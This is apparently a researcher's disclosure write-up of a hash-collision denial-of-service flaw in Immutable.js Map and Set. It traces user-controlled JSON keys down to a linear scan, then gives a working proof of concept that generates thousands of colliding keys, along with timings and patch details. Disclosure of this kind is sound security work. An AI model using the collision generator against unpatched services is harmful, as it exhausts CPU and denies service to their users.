# CVE-2026-59880: Hash-collision algorithmic complexity denial of service in Immutable.Map/Set

## Short intro

This is my first CVE: CVE-2026-59880, a Hash Collision Denial of Service issue in Immutable.js.

The simple version is this: if an application accepts JSON from a user and passes that object into Immutable.Map or Immutable.fromJS, the user may control the field names, not only the values. With a specially prepared family of keys, different keys can produce the same hash.

In the vulnerable version, when different keys produce the same hash, `Immutable.js` puts them into the same `HashCollisionNode`. The key/value pairs inside that node are simply placed in an `entries` list. In other words, the library has found the right “box” containing the keys, but it does not know where the requested key is inside that box. Every insert or lookup may therefore check the entries one by one. When thousands of keys are forced into the same box, the number of comparisons grows quickly, CPU is occupied for longer, and the request can block the event loop.

Key facts:

- CVE: CVE-2026-59880
- Advisory: [GHSA-xvcm-6775-5m9r](https://github.com/immutable-js/immutable-js/security/advisories/GHSA-xvcm-6775-5m9r)
- Package: npm immutable
- Affected: 4.x <4.3.9; 5.x >=5.0.0-beta.1 and <5.1.8
- Patched: 4.3.9 and 5.1.8
- Impact: CPU-bound Denial of Service
- Severity: High, CVSS v4 8.7

## Background

### What is Immutable.js?

To understand this bug, we first need to know what `Immutable.js` is doing. Simply put, it is a JavaScript library that provides immutable data structures. When we call `.set()`, it does not modify the old data directly; it returns a new version instead.

```js
const map1 = Immutable.Map({ name: 'alice' });
const map2 = map1.set('role', 'user');

console.log(map1.toObject());
// { name: 'alice' }

console.log(map2.toObject());
// { name: 'alice', role: 'user' }
```

In the example above, map1 stays unchanged and map2 is the new result. That is the basic idea behind “immutable”.

The part that caught my attention was `Map` and `Set`. `Immutable.js` uses `hash()` inside both structures to find and store data. So what happens if many different keys produce the same hash?

### Why does Map need a hash?

To make it easier to follow, think of Map as a phone book. When I need to find someone, I do not want to turn every page from the beginning. I want a quick way to go straight to the place where the information is stored.

`hash()` acts like that index:

```text
key -> calculate hash -> enter the tree -> store or find value
```

A collision is not automatically a bug. Every hash map has to handle collisions. I started to see the risk when three things came together: the hash was predictable, the user could control the key, and the collision bucket was handled by scanning a list entry by entry.

## Where I started tracing

At this point I did not want to jump straight to the PoC. I first wanted to make sure that a user-controlled key could really travel all the way from the request to the hash and collision bucket. If the key stayed in the request and never reached the internal data structure, there would be nothing useful to exploit.

I started following the path of one key from the request into the library: does it reach `Immutable.Map`, does it go through `hash()`, where is it stored when a collision happens, and why does this process consume so much CPU?

The path I wanted to verify was this: a key from the JSON goes through `fromJS()` or `Immutable.Map()`, and then reaches `map.set()`. From there, `Immutable.js` calls `updateMap()`, `updateNode()`, and calculates the hash for the key. If different keys produce the same hash, they are placed into the same `HashCollisionNode`. The `get()` and `update()` methods then have to check the keys in that node one by one. Once these steps are connected, it becomes clear how user-controlled input can consume a large amount of CPU.

## Tracing the code step by step

### Step 1: A JSON key reaches `fromJS()`

To make the trace concrete, assume the application has an endpoint that accepts JSON from a user and passes it directly to Immutable.js:

```js
app.post('/api/import', express.json(), (req, res) => {
  const data = Immutable.fromJS(req.body);
  res.json({ size: data.size });
});
```

Here, `express.json()` parses the JSON request body and puts the result into `req.body`. Because this data comes from the request, the user may control the fields inside the object, including the key names.

Then `Immutable.fromJS(req.body)` receives the whole object and converts it into an Immutable.js data structure. This is the line I want to follow: are the keys from `req.body` kept as they are, and do they eventually reach the hash map inside `Map`?

In `src/fromJS.js`:

```js
export function fromJS(value, converter) {
  return fromJSWith(
    [],
    converter || defaultConverter,
    value,
    '',
    converter && converter.length > 2 ? [] : undefined,
    { '': value }
  );
}
```

If `value` is `req.body`, `fromJS()` starts walking that object. The important callback is:

```js
Seq(value).map((v, k) =>
  fromJSWith(stack, converter, v, k, keyPath, value)
)
```

Here:

```text
value = the object being converted
v     = the value of each field
k     = the key of each field
```

For this input:

```json
{
  "name": "alice",
  "role": "user"
}
```

the callback receives:

```text
k = "name", v = "alice"
k = "role", v = "user"
```

So `k` is the field name from the JSON. If the JSON comes from a user, the key can be user-controlled.

At this point I did not need to read all of `fromJS()`. This callback already showed that the object key is passed as `k`, while its value is passed as `v`. That was the first confirmation that the key from the request was not lost on the way into the library.

The default converter decides whether the data becomes a `List`, `Map`, or `Set`:

```js
function defaultConverter(k, v) {
  return isIndexed(v) ? v.toList() : isKeyed(v) ? v.toMap() : v.toSet();
}
```

A keyed object takes the `isKeyed(v)` branch, so the converter calls `v.toMap()`. This is where the original object becomes an Immutable.js `Map`.

After this first conversion step, the key from `req.body` is still intact and is being passed to `toMap()`:

```text
req.body key
  -> fromJS()
  -> Seq(value).map((v, k) => ...)
  -> k is still the JSON key
  -> defaultConverter()
  -> toMap()
  -> Immutable.Map contains that key
```

### Step 2: `Map` calls `map.set(k, v)`

Next I looked at how `Map` receives that object. The important branch in the `Map` constructor is:

```js
constructor(value) {
  return value === undefined || value === null
    ? emptyMap()
    : isMap(value) && !isOrdered(value)
      ? value
      : emptyMap().withMutations((map) => {
          const iter = KeyedCollection(value);
          assertNotInfinite(iter.size);
          iter.forEach((v, k) => map.set(k, v));
        });
}
```

If the application calls:

```js
Immutable.Map({
  AaAa: 1,
  BBBB: 2
});
```

the important part is effectively:

```js
map.set('AaAa', 1);
map.set('BBBB', 2);
```

`KeyedCollection(value)` normalizes the object so Immutable.js can iterate over key/value pairs. Then `forEach()` takes each pair and calls `map.set(k, v)`. `withMutations()` only batches changes for performance; it does not transform the key or remove the hashing step.

With user-controlled input, this part of the path is:

```text
JSON object
  -> KeyedCollection(value)
  -> iter.forEach((v, k) => map.set(k, v))
  -> k is still user-controlled
```

### Step 3: `set()` reaches `updateMap()` and `updateNode()`

In `Map`, `set()` does not store the key in a simple JavaScript object. It passes the work to `updateMap()`:

```js
set(k, v) {
  return updateMap(this, k, v);
}
```

This `set()` method is only a thin wrapper. It keeps the key `k` and passes the key/value pair to the internal update logic:

```text
map.set(k, v)
  -> updateMap(map, k, v)
  -> updateNode(..., k, v, ...)
```

As `updateNode()` walks through the tree, the library needs the key hash to decide which branch to take:

```js
keyHash = hash(key);
```

This is the important security-relevant connection:

```text
user-controlled key -> hash(key)
```

### Step 4: How is a string hash calculated?

From `hash(key)`, I continued into `src/Hash.ts` to see how a string key becomes a number:

```ts
function hashString(string: string): number {
  let hashed = 0;
  for (let ii = 0; ii < string.length; ii++) {
    hashed = (31 * hashed + string.charCodeAt(ii)) | 0;
  }
  return smi(hashed);
}
```

Ignoring `| 0` and `smi()` for a moment, the main formula is:

```text
new hash = old hash * 31 + current character code
```

For `Aa`:

```text
"A": 31 * 0  + 65 = 65
"a": 31 * 65 + 97 = 2112
```

For `BB`:

```text
"B": 31 * 0  + 66 = 66
"B": 31 * 66 + 66 = 2112
```

Therefore:

```text
"Aa" != "BB"
hash("Aa") === hash("BB")
```

Each new character is processed using the same fixed formula. `| 0` forces the result into a 32-bit integer, while `smi()` converts the result into the number representation used internally by the library.

In the vulnerable version, the formula is deterministic and has no random seed. An attacker can calculate collisions ahead of time without knowing any private state from the running process.

### Step 5: From two keys to thousands of keys

After confirming that `Aa` and `BB` collide, I used those two blocks to generate many different keys:

```js
function makeCollidingStrings(rounds) {
  let keys = [''];

  for (let round = 0; round < rounds; round++) {
    const next = [];

    for (const key of keys) {
      next.push(key + 'Aa');
      next.push(key + 'BB');
    }

    keys = next;
  }

  return keys;
}
```

In each round, every existing key gets either the `Aa` or the `BB` block appended to it. There are two choices for every key, so the number of keys doubles after each round:

```text
rounds = 1 -> 2 keys
rounds = 2 -> 4 keys
rounds = 3 -> 8 keys
rounds = 14 -> 16,384 keys
```

For `rounds = 2`:

```text
AaAa
AaBB
BBAa
BBBB
```

The generated strings are different but preserve the same hash effect. The PoC verifies this using `Immutable.hash()` itself:

```js
const collisionHash = Immutable.hash(keys[0]);

const allCollide = keys.every(
  (key) => Immutable.hash(key) === collisionHash
);
```

This check matters. I am not simply assuming that the strings collide based on the formula; I ask the library whether all of the keys really return the same hash.

### Step 6: HashCollisionNode performs a linear scan

Many keys sharing a hash is not enough by itself to prove a DoS. The library could use a secondary hash or another data structure to find keys more efficiently. So the next step was to see how `HashCollisionNode` actually handles the list.

In the vulnerable version, different keys with the same full primary hash are placed in `HashCollisionNode`:

```js
new HashCollisionNode(ownerID, keyHash, [node.entry, entry])
```

The node stores two important pieces of information:

```js
this.keyHash = keyHash;
this.entries = entries;
```

`keyHash` is the hash shared by the whole bucket. `entries` is the list of the real key/value pairs, because keys with the same hash can still be completely different keys.

The `get()` function is:

```js
get(shift, keyHash, key, notSetValue) {
  const entries = this.entries;

  for (let ii = 0, len = entries.length; ii < len; ii++) {
    if (is(key, entries[ii][0])) {
      return entries[ii][1];
    }
  }

  return notSetValue;
}
```

The `get()` method reads the `entries` list, walks through it, and uses `is()` to compare the real key. Having the same hash does not mean that two keys are equal, so this key comparison is still required.

The `update()` path also scans the list to check whether the key already exists before updating or appending:

```js
const entries = this.entries;
let idx = 0;
const len = entries.length;

for (; idx < len; idx++) {
  if (is(key, entries[idx][0])) {
    break;
  }
}
```

If the bucket contains `n` entries, the first insert checks very few entries, but later inserts have to check more and more of them. The total number of checks can approach:

```text
1 + 2 + 3 + ... + n = O(n²)
```

The important detail is that not every collision is dangerous. The problem is an attacker creating many keys with the same full hash and forcing the library to use a very large linear list.

### Step 7: `Set` also goes through `Map`

At this point I also checked `Set` to see whether it follows a different path. In `src/Set.js`, `Set` keeps an internal `Map`:

```js
has(value) {
  return this._map.has(value);
}

add(value) {
  return updateSet(this, this._map.set(value, value));
}
```

So when the application calls `Set.add()`, it also reaches `Map.set()` internally:

```text
Set.add(value)
  -> internal Map.set(value, value)
  -> updateMap()
  -> hash(value)
  -> collision bucket
```

That is why both `Immutable.Map` and `Immutable.Set` are affected: the APIs are different, but they share the same hash-handling path internally.

## Proof of Concept

After tracing the source, I wrote a PoC to check each important part. First,
`makeCollidingStrings()` creates keys from the `Aa` and `BB` blocks. Then,
`Immutable.hash()` verifies that the keys really share one hash. Finally,
`buildImmutableMap()` inserts each key into a `Map` using `set()`.

The core PoC below only measures the collision case. A full benchmark should
also run normal keys with the same count as a baseline:

```js
const Immutable = require('../dist/immutable.js');

function makeCollidingStrings(rounds) {
  let keys = [''];

  for (let round = 0; round < rounds; round++) {
    const next = [];
    for (const key of keys) {
      next.push(key + 'Aa');
      next.push(key + 'BB');
    }
    keys = next;
  }

  return keys;
}

function buildImmutableMap(keys) {
  let map = Immutable.Map();
  for (const key of keys) {
    map = map.set(key, 1);
  }
  return map;
}

const collisionKeys = makeCollidingStrings(14);
const collisionHash = Immutable.hash(collisionKeys[0]);

console.log(
  collisionKeys.every((key) => Immutable.hash(key) === collisionHash)
);

const map = buildImmutableMap(collisionKeys);
```

There are three lines worth focusing on. `makeCollidingStrings(14)` creates
`2^14` keys. `collisionKeys.every(...)` checks whether all of them share the
same hash. Once that check returns `true`, `buildImmutableMap()` inserts the
keys into `Map`, exercising the `set()` path and
`HashCollisionNode.update()`.

When the original PoC was run, the write-up reported these results on its test machine:

```text
normal Map build:    40.6 ms
collision Map build: 3617.6 ms
normal Map read:     7.4 ms
collision Map read:  2614.5 ms
```

The exact numbers depend on the machine, Node.js version, and build. The important point is that both cases use the same number of keys, while the collision case consumes much more CPU.

## Impact

To see whether this matters in a real application, I went back to the flows an
application might commonly use:

```js
Immutable.Map(req.body)
Immutable.fromJS(req.body)
state.merge(userObject)
state.mergeDeep(userObject)
```

The common point in these flows is that an object or collection containing user-controlled data is passed directly into a `Map` or merged into the current state. If the object keys are colliding keys, they can activate the same path traced above.

If the application uses only fixed keys:

```js
map.set('username', req.body.username);
```

then the user controls the value but not the key. That does not follow the main trigger path for this CVE.

If a user sends an object with thousands of colliding keys through one of these
flows, building or merging the `Map` can hold the CPU for a long time. In
Node.js, that also affects the event loop, so other requests may be delayed.

## Patch / Mitigation

The upstream fix adds a per-process seeded secondary hash to find keys faster
inside large collision buckets. The public primary hash remains available;
`is()` still decides whether two keys are actually equal.

In simple terms, the fix still uses the old hash to reach the correct
`HashCollisionNode`, but adds another way to narrow down the keys inside that
node. The seed is generated separately for each process, so an attacker cannot
easily precompute this second grouping. Small buckets keep the linear path to
avoid unnecessary overhead.

```text
4.x -> upgrade to 4.3.9
5.x -> upgrade to 5.1.8 or newer
```

Before upgrading, applications can limit body size, key count, and key length. These are workarounds, not replacements for updating the dependency.

## Timeline

```text
2026-06-05: Report sent to the maintainer.
2026-06-05: Maintainer confirmed/triaged it.
2026-06-25: Patch prepared or merged.
2026-06-26: GitHub Security Advisory GHSA-xvcm-6775-5m9r published.
2026-07-08: Advisory recorded CVE-2026-59880.
```

## Reflection

This was my first CVE.

I used to think that getting my first CVE would feel extremely exciting. When it actually happened, the feeling was different. Looking back, not every security bug requires a very advanced technique. Sometimes a familiar hash formula, a linear collision bucket, and user-controlled input are enough.

The most important thing I learned was the trace. It is not enough to show that two strings have the same hash. I have to keep going:

```text
user input
  -> key
  -> hash
  -> collision node
  -> linear scan
  -> resource exhaustion
```

## Contributors

Nguyen Vuong Tuan Hiep (nvth) - Researcher

GF - Space Creator

ChatGPT - Blog editor

## References

- [GitHub Security Advisory GHSA-xvcm-6775-5m9r](https://github.com/immutable-js/immutable-js/security/advisories/GHSA-xvcm-6775-5m9r)
- [NVD CVE-2026-59880](https://nvd.nist.gov/vuln/detail/CVE-2026-59880)
- [Immutable.js fix commit](https://github.com/immutable-js/immutable-js/commit/e51d49fc612ded5ec4dfb94ff294d22074269b0f)
- [Immutable.js documentation](https://immutable-js.com/)
- CWE-400: Uncontrolled Resource Consumption
- CWE-407: Inefficient Algorithmic Complexity
- OWASP API4: Unrestricted Resource Consumption
